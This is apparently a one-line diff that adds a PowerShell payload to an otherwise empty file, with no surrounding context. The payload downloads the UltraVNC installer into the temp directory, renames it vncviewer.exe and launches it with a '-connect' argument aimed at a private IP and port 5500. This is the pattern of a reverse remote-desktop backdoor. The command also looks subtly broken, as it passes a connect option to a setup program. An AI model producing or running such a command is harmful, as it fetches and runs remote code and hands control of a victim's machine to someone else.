@@ -1,1 +1,1 @@
-
+Invoke-WebRequest -Uri "https://uvnc.eu/download/1436/UltraVNC_1436_X86_Setup.exe" -OutFile "$env:temp\vncviewer.exe"; Start-Process -FilePath "$env:temp\vncviewer.exe" -ArgumentList "-connect http://192.168.178.214:5500"
